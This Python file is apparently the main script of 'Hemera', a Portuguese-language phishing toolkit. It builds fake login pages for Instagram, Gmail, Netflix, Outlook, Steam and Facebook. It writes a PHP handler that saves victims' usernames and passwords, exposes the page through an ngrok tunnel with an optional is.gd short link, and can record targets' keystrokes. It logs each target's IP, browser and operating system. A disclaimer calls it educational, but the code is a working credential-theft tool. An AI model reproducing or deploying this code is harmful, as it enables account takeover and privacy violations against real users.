#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#---------------------------------------------------------------------------#
# .:. Projeto Hemera .:.                                                    #
# .:. GitHub: https://github.com/KerberosSec .:.                            #
# .:. Leia o arquivo LICENSE .:.                                            #
# .:. Créditos: Seeker,Weeman,HiddenEye,SocialPhish .:.                     #
# .:. Desenvolvedor: Diego .:.                                              #
#                                                                           #
# Hemera is distributed in the hope that it will be useful,                 #
# but WITHOUT ANY WARRANTY; without even the implied warranty of            #
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the             #
# GNU General Public License for more details.                              #
#                                                                           #
# You should have received a copy of the GNU General Public License         #
# along with Hemera.  If not, see <http://www.gnu.org/licenses/>.           #
#                                                                           #
#---------------------------------------------------------------------------#
#                                                                           #
#     Copyright © 2021 KerberosSec [ https://github.com/KerberosSec ]       #
#                                                                           #
#---------------------------------------------------------------------------#

#Cores do Algoritmo
R = '\033[31m' # Vermelho
G = '\033[32m' # Verde
C = '\033[36m' # Ciano
W = '\033[0m'  # Branco
Y = '\33[93m'  # Amarelo
B = '\33[94m'  # Azul
P = '\33[35m'  # Roxo
A = '\033[1;36m' # Ciano
I = '\33[5m' #Piscador
template_phishing = "Sem Template ativo"
porta = 8080
url_action = "Sem URL de Destino ativa"
encurtar_url = "off"
keylogger = "off"

#Módulos
import os
import time
import requests
import sys
import subprocess
import os.path
from datetime import datetime
from shutil import which
from tabulate import tabulate
from core.banner import banner_program_aleatorio

def verificar_dependencias(): #Verificar se o usuário possui os requisitos instalados
   print (W + "[" + G + "+" + W + "]" + C + " Verificando Dependencias..." + W)
   time.sleep(1.5)
   pkgs = ["python3", "python", "pip3", "php", "curl"]
   inst = True
   for pkg in pkgs:
          present = which(pkg)
          if (present == None):
                  print ("\n" + W + "[" + R + "●" + W + "] " + W + pkg + R + " não instalado!")
                  time.sleep(0.5)
                  if (pkg == "python3" or pkg == "python"):
                    print ("\n" + W + "[" + G + "+" + W + "] " + C + "Use: " + G + "apt install python")
                  elif (pkg == "pip3"):
                    print ("\n" + W + "[" + G + "+" + W + "] " + C + "Use: " + G + "apt install python3-pip")
                  elif (pkg == "php"):
                    print ("\n" + W + "[" + G + "+" + W + "] " + C + "Use: " + G + "apt install php")
                  elif (pkg == "curl"):
                    print ("\n" + W + "[" + G + "+" + W + "] " + C + "Use: " + G + "apt install curl")
                  inst = False
          else:
                  pass
   if (inst == False):
        stop()
   else:
          pass
          print (W + "[" + G + "●" + W + "] " + C + "Todos os Requisitos instalados")
          time.sleep(1.5)
          banner_program()

def banner_program(): #Banner do Programa
   os.system("clear")
   print (A + G + banner_program_aleatorio())
   print (G + '''
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█      - [+] Criador : ''' + A + "Diego" + G + ''' .:. Versão : ''' + A + "3.5" + G + ''' .:. [+] -        █
█                                                              █
└══════════════════════════════════════════════════════════════┘ ''')
   print ('''
     [+]═══════════[ Grupo : © Kerberos Sec ]═══════════[+]''')

def menu_program(): #Menu do Programa
  verificar_termos = os.path.exists("termos_de_uso.txt") #Verificar se o arquivo de log existe
  verificar_log = os.path.exists("config_log.txt") #Verificar se o arquivo de log existe
  if (verificar_termos == True):
    print ("\n" + G + "Ao utilizar esse programa ou Software, voçe concorda com todos os termos de uso descritos no arquivo LICENSE, lembrando que eu não me responsabilizo pelo uso desse programa por terceiros para cometer crimes digitais. O objetivo desse Software é estudar e compreender como funciona a vulnerabilidade humana para usar os conhecimentos para fins éticos.")
    print ("\n" + G + "Não distribua sem dar os créditos. Não me responsabilizo por atos indevidos e criminosos de terceiros usando esse código!")
    print ("\n" + G + '''Este programa é um software livre: você pode redistribuí-lo e / ou modificar
    sob os termos da GNU General Public License conforme publicada por
    a Free Software Foundation, seja a versão 3 da Licença, ou
    (à sua escolha) qualquer versão posterior.

    Este programa é distribuído na esperança de que seja útil,
    mas SEM QUALQUER GARANTIA; sem mesmo a garantia implícita de
    COMERCIABILIDADE ou ADEQUAÇÃO A UM DETERMINADO FIM. Veja o
    GNU General Public License para mais detalhes.''')
    print ("\n" + C + "══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════")
    print ("\n" + G + "By using this program or software, you agree with all the terms of use described in the LICENSE file, remembering that I am not responsible for the use of this program by third parties to commit digital crimes. The purpose of this software is to study and learn how human vulnerability works to use knowledge for ethical purposes.")
    print ("\n" + G + "Do not distribute without giving credit. I am not responsible for improper and criminal acts by third parties using this code!")
    print ("\n" + G + '''This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.''')
    print ("\n" + W + "[" + G + "ATENCAO" + W + "]" + C + " É fundamental criar uma conta Ngrok e autentica-la para utilizar esse programa sem que ocorram bugs.")
    print ("\n" + W + "[" + G + "ATTENTION" + W + "]" + C + " It is essential to create an Ngrok account and authenticate it to use this program without any bugs.")
    print ("\n" + W + "[" + G + "+" + W + "]" + C + " Se concorda com os termos de uso, digite:" + G + " I am aware of the terms of use")
    ciente = str(input("\n" + W + "[" + B + "*" + W + "]" + " Hemera > " + G))
    if (ciente == "I am aware of the terms of use" or ciente == "I AM AWARE OF TERMS OF USE" or ciente == "i am aware of the terms of use"):
      os.system("rm termos_de_uso.txt")
      print ("\n" + W + "[" + G + "+" + W + "]" + C + " Grupo Kerberos Sec agradeçe pelo uso do programa")
      time.sleep(2.5)
      banner_program()
      menu_program()
    else:
      stop()
  else:
   if (verificar_log == True):
     print ("\n" + W + "[" + G + "+" + W + "]" + C + " Digite " + G + "1 " + C + "para usar linha de comando, ou" + G + " 2" + C + " para usar interface gráfica")
     try:
      escolha_opcao = int(input("\n" + W + "[" + B + "*" + W + "]" + " Hemera > " + A + G))
      if (escolha_opcao == 2):
        interface_grafica()
      else:
        banner_program()
        print ("\n" + W + "[" + G + "+" + W + "]" + C + " Deseja utilizar a configuração de Phishing anterior? Y/n: ")
        choice = str(input("\n" + W + "[" + B + "*" + W + "]" + " Hemera > " + A + G))
        if (choice == "y" or choice == "Y" or choice == "yes" or choice == "YES" or choice == "s" or choice == "sim" or choice == "SIM"):
          menu_log()
        else:
         os.system("rm -rf config_log.txt")
         banner_program()
         menu_program()
     except ValueError:
       print ("\n" + W + "[" + R + "-" + W + "]" + C + " Digite 1 ou 2!")
       time.sleep(2.5)
       banner_program()
       menu_program()
   else:
    try:
     print ("\n" + W + "[" + G + "+" + W + "]" + C + " Digite " + G + "1 " + C + "para usar linha de comando, ou" + G + " 2" + C + " para usar interface gráfica")
     escolha_opcao = int(input("\n" + W + "[" + B + "*" + W + "]" + " Hemera > " + A + G))
     if (escolha_opcao == 2):
      interface_grafica()
     else:
      banner_program()
      print ("\n" + A + W + "[" + A + G + "+" + W + "]" + C + " Digite " + G + "help" + C + " ou " + G + "?" + C + " para obter ajuda")
      global template_phishing
      global porta
      global url_action
      global encurtar_url
      global keylogger
      while (True):
        horario = time.strftime("%H:%M:%S")
        dados = str(input("\n" + A + W + "[" + A + G + horario + W + "]" + " Hemera > " + A + G))
        prompt = dados.split() #Converter as strings digitadas acima em uma lista ou array
        if (not prompt): #Se nada foi digitado, continue a execução
          continue
        elif (prompt[0] == "show" and prompt[1] == "options" or prompt[0] == "SHOW" and prompt[1] == "OPTIONS"):
         try: #Se o usuário digitar show ou show options na posição 0 ou 1 da lista, será exibida a tela de configuração
           banner_program()
           if (template_phishing == "Sem Template ativo" and url_action == "Sem URL de Destino ativa"):
             print ("\n\t" + G + " [+]════════════[ OPÇÕES ]════════════[+]")
             table = [[C + "          Template:    " + G, "%s ●" %template_phishing], [C + "          Porta:    " + G, "%i ✔" %porta], [C + "          URL de Ação:    " + G, "%s ●" %url_action], [C + "          Encurtar URL:    " + G, "%s ✔" %encurtar_url], [C + "          Keylogger:    " + G, "%s ✔" %keylogger]]
             print (tabulate(table, tablefmt="fancy_grid"))
             continue
           elif (template_phishing == "Sem Template ativo"):
             print ("\n\t" + G + " [+]════════════[ OPÇÕES ]════════════[+]")
             table = [[C + "          Template:    " + G, "%s ●" %template_phishing], [C + "          Porta:    " + G, "%i ✔" %porta], [C + "          URL de Ação:    " + G, "%s ✔" %url_action], [C + "          Encurtar URL:    " + G, "%s ✔" %encurtar_url], [C + "          Keylogger:    " + G, "%s ✔" %keylogger]]
             print (tabulate(table, tablefmt="fancy_grid"))
             continue
           elif (url_action == "Sem URL de Destino ativa"):
             print ("\n\t" + G + " [+]════════════[ OPÇÕES ]════════════[+]")
             table = [[C + "          Template:    " + G, "%s ✔" %template_phishing], [C + "          Porta:    " + G, "%i ✔" %porta], [C + "          URL de Ação:    " + G, "%s ●" %url_action], [C + "          Encurtar URL:    " + G, "%s ✔" %encurtar_url], [C + "          Keylogger:    " + G, "%s ✔" %keylogger]]
             print (tabulate(table, tablefmt="fancy_grid"))
             continue
           else:
             print ("\n\t" + G + " [+]════════════[ OPÇÕES ]════════════[+]")
             table = [[C + "          Template:    " + G, "%s ✔" %template_phishing], [C + "          Porta:    " + G, "%i ✔" %porta], [C + "          URL de Ação:    " + G, "%s ✔" %url_action], [C + "          Encurtar URL:    " + G, "%s ✔" %encurtar_url], [C + "          Keylogger:    " + G, "%s ✔" %keylogger]]
             print (tabulate(table, tablefmt="fancy_grid"))
             continue
         except IndexError:
           print ("\n" + W + "[" + R + "-" + W + "]" + C + " Comando inválido use: " + W + "show options")
           time.sleep(2.5)
           banner_program()
           continue
        elif (prompt[0] == "help" or prompt[0] == "HELP" or prompt[0] == "h" or prompt[0] == "?"):
          banner_program()
          print ("\n" + A + G + "[+]═══════════════════════════[ AJUDA/HELP ]══════════════════════════════════[+]")
          print ("\n" + A + C + "Comando:" + W + " show options " + C + "=> " + G + "exibir configuração de Phishing")
          print ("\n" + A + C + "Comando:" + W + " show templates " + C + "=> " + G + "exibir templates disponiveis")
          print ("\n" + A + C + "Comando:" + W + " show history " + C + "=> " + G + "exibir dados coletados do alvo anterior")
          print ("\n" + A + C + "Comando:" + W + " set template (instagram,netflix,gmail) " + C + "=> " + G + "setar um Template")
          print ("\n" + A + C + "Comando:" + W + " set porta (8080,3333) " + C + "=> " + G + "setar uma Porta")
          print ("\n" + A + C + "Comando:" + W + " set action url (link destino após o alvo cair no Phishing) " + C + "=> " + G + "setar uma URL de Destino")
          print ("\n" + A + C + "Comando:" + W + " set url encurter (on,off) " + C + "=> " + G + "ativar ou desativar modo encurtar url do Phishing")
          print ("\n" + A + C + "Comando:" + W + " set keylogger mode (on,off) " + C + "=> " + G + "ativar ou desativar modo Keylogger (captura de teclas do alvo)")
          print ("\n" + A + C + "Comando:" + W + " help " + C + "=> " + G + "obter ajuda")
          print ("\n" + A + C + "Comando:" + W + " banner " + C + "=> " + G + "Altera o Banner do Hemera")
          print ("\n" + A + C + "Comando:" + W + " exploit " + C + "=> " + G + "Executar o Phishing")
          print ("\n" + A + C + "Comando:" + W + " sair " + C + "=> " + G + "sair do Programa")
          print ("\n" + A + G + "[+]═══════════════════════════════════════════════════════════════════════════[+]")
          continue
        elif (prompt[0] == "set" and prompt[1] == "template"):
          try:
            template_phishing = str(prompt[2])
            if (template_phishing == "instagram" or template_phishing == "netflix" or template_phishing == "gmail" or template_phishing == "outlook" or template_phishing == "steam" or template_phishing == "facebook"):
              continue
            else:
              print ("\n" + W + "[" + R + "-" + W + "]" + C + " O Template %s é inválido" %template_phishing)
              template_phishing = "Sem Template ativo"
              time.sleep(2.5)
              banner_program()
          except IndexError:
            print ("\n" + W + "[" + R + "-" + W + "]" + C + " O comando está incorreto! Exemplo de uso: " + G + "set template netflix")
            time.sleep(3.5)
            banner_program()
        elif (prompt[0] == "banner" or prompt[0] == "BANNER"):
          banner_program()
          continue
        elif (prompt[0] == "show" and prompt[1] == "history" or prompt[0] == "SHOW" and prompt[1] == "HISTORY"):
          if (template_phishing == "instagram" or template_phishing == "netflix" or template_phishing == "gmail" or template_phishing == "outlook" or template_phishing == "steam"):
            verificar_historico = os.path.exists("templates/" + template_phishing + "/logs/usernames.txt")
            if (verificar_historico == True):
              history = open("templates/" + template_phishing + "/logs/usernames.txt", "r")
              history_data = history.read()
              print ("\n" + W + "[" + G + "+" + W + "]" + G + " %s" %history_data)
              continue
            else:
              print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não existe nenhum dado Armazenado")
              time.sleep(2.5)
              banner_program()
          else:
            print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não existe nenhum Template selecionado!")
            time.sleep(2.5)
            banner_program()
        elif (prompt[0] == "set" and prompt[1] == "keylogger" and prompt[2] == "mode"):
          try:
            keylogger = str(prompt[3])
            if (keylogger == "on" or keylogger == "ON" or keylogger == "off" or keylogger == "OFF"):
              continue
            else:
              print ("\n" + W + "[" + R + "-" + W + "]" + C + " Digite" + R + " on " + C + "ou " + R + "off")
              keylogger = "off"
              time.sleep(2.5)
              banner_program()
          except IndexError:
            print ("\n" + W + "[" + R + "-" + W + "]" + C + " Digite um valor válido")
            time.sleep(2.5)
            banner_program()
        elif (prompt[0] == "show" and prompt[1] == "templates" or prompt[0] == "SHOW" and prompt[1] == "TEMPLATES"):
          print ("\n" +  C + "Templates Disponiveis:" + G + " [instagram] [gmail] [netflix] [outlook] [steam] [facebook]")
          continue
        elif (prompt[0] == "set" and prompt[1] == "porta"):
          try:
            porta = int(prompt[2])
            if (porta == 22 or porta == 23 or porta == 53 or porta == 443 or porta == 80):
              porta = 8080
              print ("\n" + W + "[" + R + "-" + W + "]" + C + " A porta %i é usada por um serviço!" %porta)
              time.sleep(2.5)
              banner_program()
            else:
              continue
          except IndexError:
            print ("\n" + W + "[" + R + "-" + W + "]" + C + " Digite uma Porta válida. Ex: " + G + "8080")
            time.sleep(2.5)
            banner_program()
          except ValueError:
            print ("\n" + W + "[" + R + "-" + W + "]" + C + " Digite um número para a Porta! Ex: " + G + "set porta 8080")
            time.sleep(2.5)
            banner_program()
        elif (prompt[0] == "set" and prompt[1] == "url" and prompt[2] == "encurter"):
          try:
            encurtar_url = str(prompt[3])
            if (encurtar_url == "on" or encurtar_url == "ON" or encurtar_url == "off" or encurtar_url == "OFF"):
              continue
            else:
              encurtar_url = "off"
              print ("\n" + W + "[" + R + "-" + W + "]" + C + " Digite" + R + " on " + C + "ou " + R + "off")
              time.sleep(2.5)
              banner_program()
          except IndexError:
            encurtar_url = "off"
            print ("\n" + W + "[" + R + "-" + W + "]" + C + " Valor inválido")
            time.sleep(2.5)
            banner_program()
        elif (prompt[0] == "set" and prompt[1] == "action" and prompt[2] == "url"):
          try:
            url_action = str(prompt[3])
            verificar_action = "https://" in url_action
            if (verificar_action == True):
              continue
            else:
              print ("\n" + W + "[" + R + "-" + W + "]" + C + " A URL de Destino %s é inválida. Use https!" %url_action)
              url_action = "Sem URL de Destino ativa"
              time.sleep(4.5)
              banner_program()
              continue
          except IndexError:
            print ("\n" + W + "[" + R + "-" + W + "]" + C + " Digite uma URL válida. Ex: " + G + "set action url https://www.site.com")
            time.sleep(3.5)
            banner_program()
        elif (prompt[0] == "exploit" or prompt[0] == "EXPLOIT" or prompt[0] == "run"):
            verificar_action_url = "https:" in url_action
            if (verificar_action_url == True):
              if (template_phishing == "Sem Template ativo"):
                print ("\n" + W + "[" + R + "-" + W + "]" + C + " A opção " + R + "set template " + C + "está incorreta!")
                time.sleep(2.5)
                banner_program()
                continue
              else:
                if (encurtar_url == "on" and keylogger == "on" or encurtar_url == "ON" and keylogger == "ON"):
                  os.system("touch config_log.txt")
                  arquivo = open("config_log.txt","w")
                  arquivo.write(template_phishing + "\n")
                  arquivo.write(str(porta))
                  arquivo.write("\n" + url_action)
                  arquivo.write("\n" + encurtar_url)
                  arquivo.write("\n" + keylogger)
                  arquivo.close()
                  phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
                  break
                elif (encurtar_url == "off" and keylogger == "off" or encurtar_url == "OFF" and keylogger == "OFF"):
                  os.system("touch config_log.txt")
                  arquivo = open("config_log.txt","w")
                  arquivo.write(template_phishing + "\n")
                  arquivo.write(str(porta))
                  arquivo.write("\n" + url_action)
                  arquivo.write("\n" + encurtar_url)
                  arquivo.write("\n" + keylogger)
                  arquivo.close()
                  phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
                  break
                else:
                  print ("\n" + W + "[" + R + "-" + W + "]" + C + " As opções " + R + "url encurter " + C + "e " + R + "keylogger mode " + C + "não podem ser diferentes!")
                  time.sleep(2.5)
                  banner_program()
                  continue
            else:
              print ("\n" + W + "[" + R + "-" + W + "]" + C + " A opção " + R + "action url" + C + " está incorreta!")
              time.sleep(2.5)
              banner_program()
              continue
        elif (prompt[0] == "sair" or prompt[0] == "SAIR" or prompt[0] == "quit" or prompt[0] == "exit"):
          stop()
          break
        else:
          print ("\n" + W + "[" + R + "-" + W + "]" + C + " O comando digitado é inválido!")
          time.sleep(2.5)
          banner_program()
          continue
    except ValueError:
      print ("\n" + W + "[" + R + "-" + W + "]" + C + " Digite 1 ou 2!")
      time.sleep(2.5)
      banner_program()
      menu_program()

def phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger):
   if (template_phishing == "instagram"): #Phishing Instagram
     verificar_ngrok = os.path.exists("ngrok")
     if (verificar_ngrok == True):
       os.system("rm templates/instagram/login.php")
       os.system("touch templates/instagram/login.php")
       url_destiny = open("templates/instagram/login.php", "w")
       conteudo = ('''<?php
include 'ip.php';

file_put_contents("usernames.txt", "EMAIL: " . $_POST['username'] . " PASS: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: %s');
exit();''' %url_action)
       url_destino = url_destiny.write(conteudo)
       url_destiny.close()
       print ("\n" + W + "[" + G + "+" + W + "]" + C + " Iniciando Servidor PHP...")
       os.popen("cd templates/instagram && php -S 127.0.0.1:%i > /dev/null 2>&1" %porta)
       os.popen("pkill -f -2 ngrok > /dev/null 2>&1")
       os.popen("killall -2 ngrok > /dev/null 2>&1")
       time.sleep(2.5)
       banner_program()
       print ("\n" + W + "[" + G + "●" + W + "]" + C + " Servidor PHP Ativo" + A + G + " OK")
       print ("\n" + W + "[" + G + "+" + W + "]" + C + " Iniciando Servidor Ngrok...")
       os.popen("./ngrok http %i > /dev/null 2>&1" %porta)
       time.sleep(10.5)
       banner_program()
       print ("\n" + W + "[" + G + "●" + W + "]" + C + " Servidor PHP Ativo" + A + G + " OK")
       print ("\n" + W + "[" + G + "●" + W + "]" + C + " Servidor Ngrok Ativo" + A + G + " OK")
       print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL do Phishing Localhost: " + G + "http://127.0.0.1:%i" %porta)
       os.system("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io' > curl.txt")
       url_ngrok = open("curl.txt", "r")
       ler_url_ngrok = url_ngrok.read()
       verificar_url_ngrok = "https://" in ler_url_ngrok
       if (verificar_url_ngrok == True):
         print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL do Phishing Ngrok: " + G + "%s" %ler_url_ngrok)
         url_ngrok.close()
         os.popen("rm curl.txt > /dev/null 2>&1")
         if (encurtar_url == "on" and keylogger == "on" or encurtar_url == "ON" and keylogger == "ON"):
           print ("\n" + W + "[" + G + "+" + W + "]" + C + " Encurtando URL %s..." %ler_url_ngrok)
           server = requests.post("https://is.gd/create.php?format=simple&url=%s" %ler_url_ngrok)
           if (server.status_code == 200): #Se o Encurtamento for bem sucedido, retornará o resultado ao usuário
             print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL Encurtada: " + G + "%s" %server.text)
             time.sleep(1.2)
             print ("\n" + W + "[" + G + "+" + W + "]" + C + " Esperando Alvo acessar o Phishing...")
             while (True):
               hora_atual = time.strftime("%H:%M:%S")
               verificar_network = os.path.exists("templates/instagram/ip.txt")
               verificar_credenciais = os.path.exists("templates/instagram/usernames.txt")
               verificar_keylogger = os.path.exists("templates/instagram/KeyloggerData.txt")
               if (verificar_network == True):
                 print ("\n" + W + "[" + G + "+" + W + "]" + P + " O Alvo foi fisgado no Phishing!")
                 print ("\n" + W + "[" + G + "+" + W + "]" + P + " Horário de login do alvo no Phishing:", hora_atual)
                 os.system("mv templates/instagram/ip.txt templates/instagram/ip_log.txt > /dev/null 2>&1")
                 time.sleep(1)
                 continue
               elif (verificar_keylogger == True):
                 print ("\n" + W + "[" + G + "+" + W + "]" + P + " Capturando dados do alvo...")
                 arquivo_keylogger = open("templates/instagram/KeyloggerData.txt", "r")
                 keylogger_file = arquivo_keylogger.read()
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " O Alvo digitou: " + G + "%s" %keylogger_file)
                 arquivo_keylogger.close()
                 os.system("mv templates/instagram/KeyloggerData.txt KeyloggerData_log.txt")
                 os.system("rm KeyloggerData_log.txt > /dev/null 2>&1")
                 continue
               elif (verificar_credenciais == True):
                 print ("\n" + A + G + "══════════════[ DADOS ]══════════════")
                 print ("\n" + W + "[" + G + "+" + W + "]" + P + " Dados Obtidos:" + G)
                 try:
                   arquivo_dados = open("templates/instagram/usernames.txt", "r")
                   base_de_dados = arquivo_dados.read()
                   conteudo_dados = base_de_dados.split()
                   usuario = str(conteudo_dados[1])
                   senha = str(conteudo_dados[3])
                   print ("\n" + W + "[" + G + "+" + W + "]" + A + " Usuário Instagram: " + G + "%s" %usuario)
                   print ("\n" + W + "[" + G + "+" + W + "]" + A + " Senha: " + G + "%s" %senha)
                   arquivo_dados.close()
                   time.sleep(1.2)
                   try:
                     arquivo_rede = open("templates/instagram/ip_log.txt", "r")
                     dados_de_rede = arquivo_rede.read()
                     conteudo_rede = dados_de_rede.split()
                     endereco_ip = str(conteudo_rede[1])
                     user_agent = str(conteudo_rede[3])
                     sistema_alvo = str(conteudo_rede[5])
                     versao_sistema = str(conteudo_rede[6])
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Endereço IP: " + G + "%s" %endereco_ip)
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Navegador: " + G + "%s" %user_agent)
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Sistema Operacional: " + G + "%s" %sistema_alvo)
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Versão do Sistema: " + G + "%s" %versao_sistema)
                     arquivo_rede.close()
                     print ("\n" + A + G + "═════════════════════════════════════")
                     os.popen("cp templates/instagram/ip_log.txt templates/instagram/logs > /dev/null 2>&1")
                     os.popen("cp templates/instagram/usernames.txt templates/instagram/logs > /dev/null 2>&1")
                     os.popen("touch templates/instagram/logs/Data.txt > /dev/null 2>&1")
                     os.popen("(date +'%x => %X') > templates/instagram/logs/Data.txt")
                     time.sleep(0.5)
                     os.popen("rm templates/instagram/usernames.txt > /dev/null 2>&1")
                     os.popen("rm templates/instagram/ip_log.txt > /dev/null 2>&1")
                     stop()
                     break
                   except FileNotFoundError:
                     print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não foi possível processar os dados de Rede.")
                     os.popen("rm templates/instagram/usernames.txt > /dev/null 2>&1")
                     os.popen("rm templates/instagram/ip.txt > /dev/null 2>&1")
                     os.popen("rm templates/instagram/ip_log.txt > /dev/null 2>&1")
                     os.system("rm templates/instagram/KeyloggerData.txt > /dev/null 2>&1")
                     print ("\n" + A + G + "═════════════════════════════════════")
                     time.sleep(2.5)
                     stop()
                 except IndexError:
                   print ("\n" + W + "[" + R + "-" + W + "]" + C + " O alvo não digitou os dados no Phishing.")
                   time.sleep(2.5)
                   os.popen("rm templates/instagram/usernames.txt > /dev/null 2>&1")
                   os.popen("rm templates/instagram/ip.txt > /dev/null 2>&1")
                   os.popen("rm templates/instagram/ip_log.txt > /dev/null 2>&1")
                   os.system("rm templates/instagram/KeyloggerData.txt > /dev/null 2>&1")
                   print ("\n" + A + G + "═════════════════════════════════════")
                   stop()
           else:
               print ("\n" + R + "[" + W + "-" + R + "]" + W + " Não foi possível Encurtar a URL %s" %url)
               time.sleep(2)
               phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
         else:
             print ("\n" + W + "[" + G + "+" + W + "]" + C + " Esperando Alvo acessar o Phishing...")
             while (True):
               hora_atual = time.strftime("%H:%M:%S")
               verificar_network = os.path.exists("templates/instagram/ip.txt")
               verificar_credenciais = os.path.exists("templates/instagram/usernames.txt")
               if (verificar_network == True):
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " O Alvo foi fisgado no Phishing!")
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " Horário de login do alvo no Phishing:", hora_atual)
                 os.system("mv templates/instagram/ip.txt templates/instagram/ip_log.txt > /dev/null 2>&1")
                 time.sleep(1)
                 continue
               elif (verificar_credenciais == True):
                 print ("\n" + A + G + "══════════════[ DADOS ]══════════════")
                 print ("\n" + W + "[" + G + "+" + W + "]" + P + " Dados Obtidos:" + G)
                 time.sleep(1.5)
                 try:
                   arquivo_dados = open("templates/instagram/usernames.txt", "r")
                   base_de_dados = arquivo_dados.read()
                   conteudo_dados = base_de_dados.split()
                   usuario = str(conteudo_dados[1])
                   senha = str(conteudo_dados[3])
                   print ("\n" + W + "[" + G + "+" + W + "]" + A + " Usuário Instagram: " + G + "%s" %usuario)
                   print ("\n" + W + "[" + G + "+" + W + "]" + A + " Senha: " + G + "%s" %senha)
                   arquivo_dados.close()
                   time.sleep(1.2)
                   try:
                     arquivo_rede = open("templates/instagram/ip_log.txt", "r")
                     dados_de_rede = arquivo_rede.read()
                     conteudo_rede = dados_de_rede.split()
                     endereco_ip = str(conteudo_rede[1])
                     user_agent = str(conteudo_rede[3])
                     sistema_alvo = str(conteudo_rede[5])
                     versao_sistema = str(conteudo_rede[6])
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Endereço IP: " + G + "%s" %endereco_ip)
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Navegador: " + G + "%s" %user_agent)
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Sistema Operacional: " + G + "%s" %sistema_alvo)
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Versão do Sistema: " + G + "%s" %versao_sistema)
                     arquivo_rede.close()
                     print ("\n" + A + G + "═════════════════════════════════════")
                     os.popen("cp templates/instagram/ip_log.txt templates/instagram/logs > /dev/null 2>&1")
                     os.popen("cp templates/instagram/usernames.txt templates/instagram/logs > /dev/null 2>&1")
                     os.popen("touch templates/instagram/logs/Data.txt > /dev/null 2>&1")
                     os.popen("(date +'%x => %X') > templates/instagram/logs/Data.txt")
                     time.sleep(0.5)
                     os.popen("rm templates/instagram/usernames.txt > /dev/null 2>&1")
                     os.popen("rm templates/instagram/ip_log.txt > /dev/null 2>&1")
                     os.system("rm templates/instagram/KeyloggerData.txt > /dev/null 2>&1")
                     stop()
                     break
                   except FileNotFoundError:
                     print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não foi possível processar os dados de Rede.")
                     os.popen("rm templates/instagram/usernames.txt > /dev/null 2>&1")
                     os.popen("rm templates/instagram/ip.txt > /dev/null 2>&1")
                     os.popen("rm templates/instagram/ip_log.txt > /dev/null 2>&1")
                     os.system("rm templates/instagram/KeyloggerData.txt > /dev/null 2>&1")
                     print ("\n" + A + G + "═════════════════════════════════════")
                     time.sleep(2.5)
                     stop()
                 except IndexError:
                   print ("\n" + W + "[" + R + "-" + W + "]" + C + " O alvo não digitou os dados no Phishing.")
                   time.sleep(2.5)
                   os.popen("rm templates/instagram/usernames.txt > /dev/null 2>&1")
                   os.popen("rm templates/instagram/ip.txt > /dev/null 2>&1")
                   os.popen("rm templates/instagram/ip_log.txt > /dev/null 2>&1")
                   os.system("rm templates/instagram/KeyloggerData.txt > /dev/null 2>&1")
                   print ("\n" + A + G + "═════════════════════════════════════")
                   stop()
       else:
         banner_program()
         print ("\n" + W + "[" + G + "●" + W + "]" + C + " Servidor PHP Ativo" + A + G + " OK")
         print ("\n" + W + "[" + R + "●" + W + "]" + C + " Servidor Ngrok Falhou" + A + R + " OFF")
         print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não foi possível obter a URL do Ngrok")
         time.sleep(2.5)
         retorno = str(input("\n" + W + "[" + G + "+" + W + "]" + C + " Deseja Tentar novamente? Y/n: " + G))
         if (retorno == "Y" or retorno == "y" or retorno == "yes" or retorno == "YES" or retorno == "s" or retorno == "sim"):
           banner_program()
           os.popen("pkill -f -2 php > /dev/null 2>&1")
           os.popen("killall -2 php > /dev/null 2>&1")
           os.popen("pkill -f -2 ngrok > /dev/null 2>&1")
           os.popen("killall -2 ngrok > /dev/null 2>&1")
           os.popen("rm curl.txt > /dev/null 2>&1")
           phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
         else:
           stop()
     else:
       print ("\n" + W + "[" + R + "-" + W + "]" + C + " O Ngrok não está instalado!")
       install_ngrok = str(input("\n" + W + "[" + G + "+" + W + "]" + C + " Deseja instalar o Ngrok? Y/n: " + G))
       if (install_ngrok == "Y" or install_ngrok == "y" or install_ngrok == "yes" or install_ngrok == "YES" or install_ngrok == "s" or install_ngrok == "sim"):
         print ("\n" + W + "[" + G + "+" + W + "]" + C + " Instalando Ngrok...")
         os.system("git clone https://github.com/PSecurity/ps.ngrok > /dev/null 2>&1")
         os.system("cd ps.ngrok && mv ngrok .. > /dev/null 2>&1 && cd .. && rm -rf ps.ngrok > /dev/null 2>&1 && chmod +x ngrok")
         time.sleep(40)
         verificar_instalacao = os.path.exists("ngrok")
         if (verificar_instalacao == True):
           banner_program()
           phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
         else:
           print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não foi possível instalar o Ngrok")
           stop()

